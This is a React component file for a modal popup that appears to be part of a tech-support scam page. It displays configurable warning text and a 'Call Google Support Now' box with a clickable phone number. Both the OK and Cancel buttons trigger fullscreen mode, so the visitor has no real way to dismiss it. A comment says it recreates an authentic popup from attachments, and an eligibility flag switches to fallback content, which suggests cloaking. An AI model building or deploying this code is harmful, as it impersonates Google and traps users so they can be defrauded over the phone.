import { siteConfig } from '../config/siteConfig.js';

/**
 * PopupCard component
 * 
 * Recreates the authentic modal popup as seen in Attachment 1 and Attachment 2.
 * Preserves the current configured text and phone number.
 * 
 * @param {Object} props
 * @param {boolean} props.isEligible
 * @param {Function} props.onTriggerFullscreen
 */
export function PopupCard({ isEligible = true, onTriggerFullscreen }) {
  const content = isEligible ? siteConfig.popup : siteConfig.fallback;
  const { phoneNumber, phoneDisplay } = siteConfig;

  return (
    <div className="popup-dialog-overlay" role="dialog" aria-modal="true">
      <div className="popup-card-box">
        {/* Black Box Area (Upper section of modal as in Attachment 1 & 2) */}
        <div className="popup-black-area">
          <div className="popup-black-inner">
            {content.heading && (
              <h2 className="popup-black-title">{content.heading}</h2>
            )}
            {content.heading1 && (
              <p className="popup-black-sub">{content.heading1}</p>
            )}
            {content.introText && (
              <p className="popup-black-body">{content.introText}</p>
            )}
            {content.detailText && (
              <p className="popup-black-detail">{content.detailText}</p>
            )}
            {content.subText && (
              <p className="popup-black-note">{content.subText}</p>
            )}
          </div>
        </div>

        {/* Support Call Box Area */}
        <div className="popup-support-container">
          <div className="popup-support-label">Call Google Support Now:</div>
          <a
            href={`tel:${phoneNumber}`}
            className="popup-phone-link-box"
            aria-label={`Call Support: ${phoneDisplay}`}
          >
            {phoneDisplay}
          </a>
        </div>

        {/* OK and Cancel Actions */}
        <div className="popup-button-group">
          <button
            type="button"
            className="popup-btn-action popup-btn-ok"
            onClick={onTriggerFullscreen}
          >
            OK
          </button>
          <button
            type="button"
            className="popup-btn-action popup-btn-cancel"
            onClick={onTriggerFullscreen}
          >
            Cancel
          </button>
        </div>
      </div>
    </div>
  );
}
